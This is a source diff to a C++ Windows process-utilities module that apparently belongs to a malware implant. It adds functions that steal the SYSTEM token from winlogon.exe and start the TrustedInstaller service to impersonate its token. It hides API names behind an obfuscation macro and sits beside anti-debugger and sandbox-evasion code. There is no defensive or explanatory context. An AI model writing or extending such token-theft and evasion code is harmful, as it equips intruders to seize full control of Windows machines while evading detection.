@@ -107,6 +107,7 @@ BOOL ProcessUtilities::Init() {
 		return FALSE;
 
 	_FreeLibrary = GetFunctionAddress<PPROCFN::_FreeLibrary>(kerneldll, std::string(HIDE("FreeLibrary")));
+	_SetThreadToken = GetFunctionAddress<PPROCFN::_SetThreadToken>(advapi, std::string(HIDE("SetThreadToken")));
 
 	return TRUE;
 }
@@ -310,6 +311,18 @@ DWORD ProcessUtilities::StartWindowsService(std::string serviceName) {
 	return status.dwProcessId;
 }
 
+HANDLE ProcessUtilities::ImpersonateWithToken(HANDLE token) {
+	HMODULE ntdll = GetLoadedLib(freqDLLS::advapi32);
+	PPROCFN::_ImpersonateLoggedOnUser _ImpersonateLoggedOnUser = GetFunctionAddress<PPROCFN::_ImpersonateLoggedOnUser>(ntdll, std::string(HIDE("ImpersonateLoggedOnUser")));
+
+	if ( !_ImpersonateLoggedOnUser(token) ) {
+		SysNtClose(token);
+		return NULL;
+	}
+
+	return token;
+}
+
 HANDLE ProcessUtilities::GetSystemToken() {
 	DWORD logonPID = PIDFromName(HIDE("winlogon.exe"));
 	if ( logonPID == 0 ) // bad process id
@@ -320,18 +333,18 @@ HANDLE ProcessUtilities::GetSystemToken() {
 	if ( winlogon == NULL )
 		return NULL;
 
-	HMODULE ntdll = GetLoadedLib(freqDLLS::advapi32);
-	PPROCFN::_ImpersonateLoggedOnUser _ImpersonateLoggedOnUser = GetFunctionAddress<PPROCFN::_ImpersonateLoggedOnUser>(ntdll, std::string(HIDE("ImpersonateLoggedOnUser")));
-
-	if ( !_ImpersonateLoggedOnUser(winlogon) ) {
-		SysNtClose(winlogon);
-		return NULL;
-	}
-
-	//SandboxCompromise::DelayOperation();
-
-	return winlogon;
+	return ImpersonateWithToken(winlogon);
 }
+
+HANDLE ProcessUtilities::GetTrustedInstallerToken() {
+	DWORD  pid   = ProcessUtilities::StartWindowsService(std::string(HIDE("TrustedInstaller")));
+	HANDLE token = ProcessUtilities::CreateProcessAccessToken(pid);
+	if ( token == NULL )
+		return NULL;
+
+	return ImpersonateWithToken(token);
+}
+
 
 BOOL ProcessUtilities::CheckNoDebugger() {
 	PPEB filePEB = ( PPEB ) GetPebAddress();
